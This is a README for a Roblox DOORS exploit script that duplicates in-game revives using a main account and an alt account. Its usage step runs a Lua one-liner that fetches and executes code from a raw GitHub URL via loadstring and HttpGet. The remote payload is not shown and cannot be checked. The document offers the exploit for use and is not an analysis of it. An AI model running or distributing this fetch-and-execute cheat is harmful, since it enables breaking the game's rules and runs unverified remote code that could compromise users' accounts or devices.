# Revive Duper (Roblox DOORS)
This script allows you to dupe revives in DOORS.
Original revive duper script by upio.

# How to use it?
1. You need to have an alt account that would be used for duping
2. Create elevator with main and alt account and press start
3. When both accounts loaded in execute this script on both accounts (you can execute at door 0):
```lua
MainAccount = "MAIN ACCOUNT NAME" -- this account will receive revives
DuplicationCount = 1000 -- how many revives to dupe
PreventLag = DuplicationCount >= 1000 -- if you set big duplication count you should set this to true
PreventError266 = DuplicationCount >= 100000 -- if you set really big duplication count you should set this to true

loadstring(game:HttpGet("https://raw.githubusercontent.com/tplaygd/revive/refs/heads/main/.lua"))()
```
4. Now wait until the script does everything!
